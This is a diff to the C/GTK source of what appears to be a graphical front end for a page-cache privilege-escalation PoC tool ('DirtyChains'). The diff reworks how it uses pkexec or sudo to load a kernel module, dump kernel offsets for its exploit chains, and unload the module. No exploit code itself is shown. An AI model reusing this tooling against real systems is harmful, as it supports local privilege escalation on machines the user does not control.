@@ -3693,7 +3693,7 @@ int ovswrap_main(int argc, char **argv)
 
 #define APP_TITLE       "DirtyChains · 页缓存提权"
 /* 构建标识: 标题栏副标题上直接显示, 用来确认跑的是不是最新这份 */
-#define DF_BUILD        "2026-10-31-r26"
+#define DF_BUILD        "2026-10-31-r27"
 #define APP_SUBTITLE    "六链 PoC 图形前端 · " DF_BUILD
 #define LOG_MAX_LINES   20000
 #define PTY_COLS        110
@@ -5707,45 +5707,64 @@ static gboolean sudo_nopasswd(void)
     return n > 0 && out[0] == '0';
 }
 
-/* how: NULL = 当前身份, "pkexec" = 图形提权, "sudo" = 免密 sudo */
-static gboolean spawn_shell_as(const char *how, const char *script,
-                               char **out, char **err, int *st)
+
+/*
+ * 不经过 shell 的提权执行。
+ *
+ * 之前这里是把一串多行 shell 脚本交给 sh -c, 结果在部分精简 /bin/sh
+ * (dash 变体、busybox、被替换过的 sh) 上直接报
+ *     /bin/sh: 1: Syntax error: ")" unexpected
+ * 因为脚本里的 $(command -v ...) 、if ! ... 被当作交互输入逐行解析。
+ * insmod/rmmod 本来就是"命令 + 参数"的形式, 直接用 argv 执行, 不经过
+ * 任何 shell, 引号、括号、变量展开的问题全部消失。
+ */
+static char *find_tool(const char *name)
 {
-    char *argv[6];
-    int i = 0;
+    char *p = g_find_program_in_path(name);
+
+    if (p)
+        return p;
+    return g_strdup_printf("/sbin/%s", name);
+}
+
+/* how: NULL = 当前身份, "pkexec" = 图形提权, "sudo" = 免密 sudo */
+static gboolean spawn_argv_as(const char *how, char *const *cmd,
+                              char **out, char **err, int *st)
+{
+    char *argv[12];
+    int i = 0, j;
     GError *ge = NULL;
     gboolean ok;
 
-    if (!how) {
-        argv[i++] = (char *)"/bin/sh";
-    } else if (!strcmp(how, "pkexec")) {
+    if (how && !strcmp(how, "pkexec")) {
         argv[i++] = (char *)"/usr/bin/pkexec";
-    } else {
+    } else if (how && !strcmp(how, "sudo")) {
         argv[i++] = (char *)"sudo";
         argv[i++] = (char *)"-n";
     }
-    argv[i++] = (char *)"/bin/sh";
-    argv[i++] = (char *)"-c";
-    argv[i++] = (char *)script;
+    for (j = 0; cmd[j] && i < 11; j++)
+        argv[i++] = cmd[j];
     argv[i] = NULL;
 
     ok = g_spawn_sync(NULL, argv, NULL, G_SPAWN_SEARCH_PATH, NULL, NULL,
                       out, err, st, &ge);
     if (!ok) {
         if (err && !*err)
-            *err = g_strdup(ge->message);
-        g_error_free(ge);
+            *err = g_strdup(ge ? ge->message : "起不了子进程");
+        if (ge)
+            g_error_free(ge);
     }
     return ok;
 }
 
 /*
- * 依次尝试: 已经是 root -> pkexec（有桌面时）-> 免密 sudo。
- * pkexec 失败（用户点取消 / 没有 polkit agent）时不要直接放弃，
- * 很多机器其实配了 NOPASSWD sudo。
+ * 依次尝试: 已经是 root -> pkexec -> 免密 sudo。
+ * pkexec 的 126/127 表示"用户取消/没授权/命令不存在", 只有这两种才回退
+ * sudo; 子命令自己失败 (比如 insmod 报错) 要如实返回, 不能当成提权失败
+ * 再跑一遍。
  */
-static gboolean run_privileged(const char *script, char **out, char **err,
-                               int *st, const char **via)
+static gboolean run_priv_argv(char *const *cmd, char **out, char **err,
+                              int *st, const char **via)
 {
     gboolean ok;
 
@@ -5754,12 +5773,13 @@ static gboolean run_privileged(const char *script, char **out, char **err,
 
     if (geteuid() == 0) {
         *via = "root";
-        return spawn_shell_as(NULL, script, out, err, st);
+        return spawn_argv_as(NULL, cmd, out, err, st);
     }
 
     if (have_pkexec()) {
-        ok = spawn_shell_as("pkexec", script, out, err, st);
-        if (ok && WIFEXITED(*st) && WEXITSTATUS(*st) == 0) {
+        ok = spawn_argv_as("pkexec", cmd, out, err, st);
+        if (ok && WIFEXITED(*st) &&
+            WEXITSTATUS(*st) != 126 && WEXITSTATUS(*st) != 127) {
             *via = "pkexec";
             return TRUE;
         }
@@ -5770,7 +5790,7 @@ static gboolean run_privileged(const char *script, char **out, char **err,
     }
 
     *via = "sudo -n";
-    return spawn_shell_as("sudo", script, out, err, st);
+    return spawn_argv_as("sudo", cmd, out, err, st);
 }
 
 /* insmod 常见失败的一句话诊断 */
@@ -5810,7 +5830,8 @@ static void act_root_offset(GtkWidget *w, gpointer data)
     const Chain *c = cur_chain(a);
     const char *hdr =
         "\n\033[2m══ root 获取偏移表：krec_dump.ko 直接读本机偏移 ══\n\033[0m\n";
-    char *ko = NULL, *why = NULL, *script = NULL, *qko = NULL;
+    char *ko = NULL, *why = NULL;
+    char *insmod_bin = NULL, *rmmod_bin = NULL;
     char *out = NULL, *err = NULL, *th = NULL, *rel = NULL, *src = NULL;
     char *root = NULL, *sub = NULL, *path = NULL, *recp = NULL;
     const char *via = "root";
@@ -5860,26 +5881,43 @@ static void act_root_offset(GtkWidget *w, gpointer data)
         return;
     }
 
-    /* 2. 提权加载 -> 读 JSON -> 卸载（脚本里用顺序执行保证一定 rmmod） */
-    qko = g_shell_quote(ko);
-    script = g_strdup_printf(
-        "set -u\n"
-        "KO=%s\n"
-        "M=krec_dump\n"
-        "INSMOD=$(command -v insmod 2>/dev/null || echo /sbin/insmod)\n"
-        "RMMOD=$(command -v rmmod 2>/dev/null || echo /sbin/rmmod)\n"
-        "if grep -q \"^$M \" /proc/modules 2>/dev/null; then"
-        " $RMMOD $M >/dev/null 2>&1 || true; fi\n"
-        "if ! $INSMOD \"$KO\" >&2; then exit 3; fi\n"
-        "rc=0\n"
-        "cat /proc/krec_dump 2>/dev/null || rc=4\n"
-        "$RMMOD $M >/dev/null 2>&1 || true\n"
-        "exit $rc\n", qko);
+    /*
+     * 2. 提权 insmod -> 读 /proc/krec_dump -> 立刻 rmmod。
+     *
+     * 全程不走 shell: 每条命令都是 argv, 免得不同 /bin/sh 在解析
+     * 多行脚本时报 "Syntax error: ) unexpected"。
+     */
+    insmod_bin = find_tool("insmod");
+    rmmod_bin = find_tool("rmmod");
 
-    gtk_label_set_text(GTK_LABEL(a->status_lbl), "正在加载 krec_dump.ko …");
-    gtk_widget_set_name(a->status_lbl, "status-run");
+    /* 之前若有残留的同名模块, 先卸掉, 否则 insmod 会 File exists */
+    if (module_loaded("krec_dump")) {
+        char *r[3];
+        int rst = -1;
+        char *ro = NULL, *re = NULL;
+        const char *rv = "root";
 
-    ok = run_privileged(script, &out, &err, &st, &via);
+        r[0] = rmmod_bin;
+        r[1] = (char *)"krec_dump";
+        r[2] = NULL;
+        run_priv_argv(r, &ro, &re, &rst, &rv);
+        g_free(ro);
+        g_free(re);
+    }
+
+    {
+        char *cmd[3];
+
+        cmd[0] = insmod_bin;
+        cmd[1] = ko;
+        cmd[2] = NULL;
+
+        gtk_label_set_text(GTK_LABEL(a->status_lbl), "正在加载 krec_dump.ko …");
+        gtk_widget_set_name(a->status_lbl, "status-run");
+
+        ok = run_priv_argv(cmd, &out, &err, &st, &via);
+    }
+
     if (!ok) {
         g_snprintf(msg, sizeof(msg), "\033[31m[!] 执行失败：%s\033[0m\n",
                    err && *err ? err : "起不了子进程");
@@ -5893,17 +5931,22 @@ static void act_root_offset(GtkWidget *w, gpointer data)
     if (!WIFEXITED(st) || WEXITSTATUS(st) != 0) {
         int ec = WIFEXITED(st) ? WEXITSTATUS(st) : -1;
         const char *hint = insmod_hint(err);
+        /* 半加载的情况也要收尾 */
+        char *r[3];
+        int rst = -1;
+        char *ro = NULL, *re = NULL;
+        const char *rv = "root";
 
-        if (ec == 3)
-            g_snprintf(msg, sizeof(msg),
-                       "\033[31m[!] insmod krec_dump.ko 失败（%s）\033[0m\n", via);
-        else if (ec == 4)
-            g_snprintf(msg, sizeof(msg),
-                       "\033[31m[!] 模块加载了，但读 /proc/krec_dump 失败\033[0m\n");
-        else
-            g_snprintf(msg, sizeof(msg),
-                       "\033[31m[!] 提权 / 加载失败（%s，退出码 %d）\033[0m\n",
-                       via, ec);
+        r[0] = rmmod_bin;
+        r[1] = (char *)"krec_dump";
+        r[2] = NULL;
+        run_priv_argv(r, &ro, &re, &rst, &rv);
+        g_free(ro);
+        g_free(re);
+
+        g_snprintf(msg, sizeof(msg),
+                   "\033[31m[!] insmod krec_dump.ko 失败（%s，退出码 %d）\033[0m\n",
+                   via, ec);
         ansi_feed(a, msg, strlen(msg));
         if (err && *err)
             log_append_plain(a, err);
@@ -5921,6 +5964,45 @@ static void act_root_offset(GtkWidget *w, gpointer data)
         gtk_label_set_text(GTK_LABEL(a->status_lbl), "偏移表获取失败");
         gtk_widget_set_name(a->status_lbl, "status-err");
         goto done;
+    }
+
+    /*
+     * 3. 读偏移记录, 无论成败都立刻卸载模块。
+     *    /proc/krec_dump 的内容随进程 uid 检查, 所以用 root 身份的
+     *    文件读取 (这里是同一个 euid==0 的进程或提权后的子进程)。
+     */
+    {
+        char *json = NULL;
+        char *r[3];
+        int rst = -1;
+        char *ro = NULL, *re = NULL;
+        const char *rv = "root";
+
+        g_free(out);
+        out = NULL;
+
+        if (geteuid() == 0) {
+            g_file_get_contents("/proc/krec_dump", &json, NULL, NULL);
+        } else {
+            char *c[3];
+
+            c[0] = (char *)"cat";
+            c[1] = (char *)"/proc/krec_dump";
+            c[2] = NULL;
+            run_priv_argv(c, &json, &re, &rst, &rv);
+            g_free(re);
+            re = NULL;
+            rst = -1;
+        }
+
+        r[0] = rmmod_bin;
+        r[1] = (char *)"krec_dump";
+        r[2] = NULL;
+        run_priv_argv(r, &ro, &re, &rst, &rv);
+        g_free(ro);
+        g_free(re);
+
+        out = json;
     }
 
     if (!out || !strstr(out, "\"release\"")) {
@@ -6002,8 +6084,8 @@ static void act_root_offset(GtkWidget *w, gpointer data)
 done:
     g_free(ko);
     g_free(why);
-    g_free(script);
-    g_free(qko);
+    g_free(insmod_bin);
+    g_free(rmmod_bin);
     g_free(out);
     g_free(err);
     g_free(th);
